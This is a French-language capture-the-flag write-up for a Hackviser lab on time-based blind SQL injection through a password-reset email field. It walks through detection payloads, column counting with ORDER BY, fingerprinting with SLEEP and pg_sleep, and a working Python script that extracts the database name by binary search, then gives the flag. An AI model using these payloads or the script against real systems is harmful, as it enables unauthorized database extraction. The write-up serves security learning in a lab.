# Write-up : Time-Based Blind SQL Injection - Hackviser

## Informations sur le Challenge

- **Nom** : Time-Based Blind SQL Injection
- **Plateforme** : Hackviser
- **Difficulté** : Intermédiaire
- **Objectif** : Extraire le nom de la base de données via une injection SQL basée sur le temps (Blind).

---

## 1. Analyse Initiale

Le laboratoire présente une page de réinitialisation de mot de passe demandant une adresse e-mail. Peu importe l'entrée (si elle est valide ou non), le serveur renvoie toujours le même message : *"Password reset link has been sent to your email address."*

### Détection de la vulnérabilité

En testant des payloads classiques sur le champ `email`, on observe des comportements différents dans les réponses HTTP :

- `test@example.com` -> **HTTP 200** (Normal)
- `test@example.com'` -> **HTTP 500** (Erreur de syntaxe SQL suspectée)
- `test@example.com' --` -> **HTTP 200** (Commentaire SQL, la requête redevient valide)

Cela confirme la présence d'une injection SQL classique, mais comme le contenu de la page ne change pas, nous devons utiliser une technique "Blind" (aveugle).

---

## 2. Énumération et Empreinte (Fingerprinting)

### Identification du nombre de colonnes

Pour utiliser `UNION SELECT`, il faut connaître le nombre exact de colonnes dans la requête `SELECT` d'origine.

- `' ORDER BY 1--` -> **200 OK**
- `' ORDER BY 7--` -> **200 OK**
- `' ORDER BY 8--` -> **500 Internal Server Error**

La requête originale contient donc **7 colonnes**.

### Identification du SGBD

En utilisant des fonctions de délai spécifiques à chaque moteur :

- **PostgreSQL** : `' UNION SELECT 1,2,3,4,5,6,pg_sleep(5)--` (Pas de délai)
- **MySQL** : `' UNION SELECT 1,2,3,4,5,6,SLEEP(5)--` -> **Délai de ~5.4s observé.**

Le système utilise donc **MySQL**.

---

## 3. Stratégie d'Extraction

Comme nous ne pouvons voir aucune donnée, nous posons des questions binaires (Vrai/Faux) à la base de données. Si la réponse est "Vrai", nous déclenchons un `SLEEP()`.

**Payload type :**

```sql
test' UNION SELECT 1,2,3,4,5,6,IF(CONDITION, SLEEP(2), 0)-- 
```

---

## 4. Script d'Exploitation (Python)

Voici le script utilisé pour automatiser l'extraction du nom de la base de données en utilisant une recherche binaire pour optimiser le temps.

```python
import requests
import time

url = "https://ready-knockout.europe1.hackviser.space"

def test_condition(condition):
    # Utilise UNION SELECT avec 7 colonnes (déterminé par ORDER BY)
    # On injecte le SLEEP dans la 7ème colonne
    payload = f"test' UNION SELECT 1,2,3,4,5,6,IF({condition}, SLEEP(2), 0)-- "
    start = time.time()
    try:
        # Envoi de la requête POST
        r = requests.post(url, data={"email": payload}, timeout=10)
        elapsed = time.time() - start
        # Si le temps de réponse est > 2s, la condition est VRAIE
        return elapsed >= 2
    except requests.exceptions.Timeout:
        return True

def get_length():
    print("[*] Recherche de la longueur du nom de la base de données...")
    for i in range(1, 50):
        if test_condition(f"LENGTH(DATABASE())={i}"):
            return i
    return None

def get_db_name(length):
    print(f"[*] Extraction du nom ({length} caractères)...")
    name = ""
    for i in range(1, length + 1):
        low = 32
        high = 126
        found_char = '?'
        while low <= high:
            mid = (low + high) // 2
            # Recherche binaire via code ASCII
            if test_condition(f"ASCII(SUBSTRING(DATABASE(),{i},1))>{mid}"):
                low = mid + 1
            else:
                found_char = chr(mid)
                high = mid - 1
        name += found_char
        print(f"[+] Trouvé : {name}")
    return name

if __name__ == "__main__":
    length = get_length()
    if length:
        print(f"[+] Longueur détectée : {length}")
        name = get_db_name(length)
        print(f"\n[!] Nom de la base de données : {name}")
    else:
        print("[-] Impossible de déterminer la longueur.")
```

---

## 5. Résultats

L'exécution du script a permis de découvrir les informations suivantes :

1. **Longueur** : 6 caractères.
2. **Nom** : `utopia`

**Flag/Réponse** : `utopia`

---

## Points Clés à Retenir

- Toujours tester le nombre de colonnes avec `ORDER BY` avant un `UNION SELECT`.
- Le temps de réponse peut varier légèrement (latence réseau), d'où l'importance de choisir un délai (`SLEEP`) suffisant (2-3 secondes est souvent un bon compromis).
- La recherche binaire (`ASCII() > mid`) est beaucoup plus rapide qu'une recherche linéaire caractère par caractère.
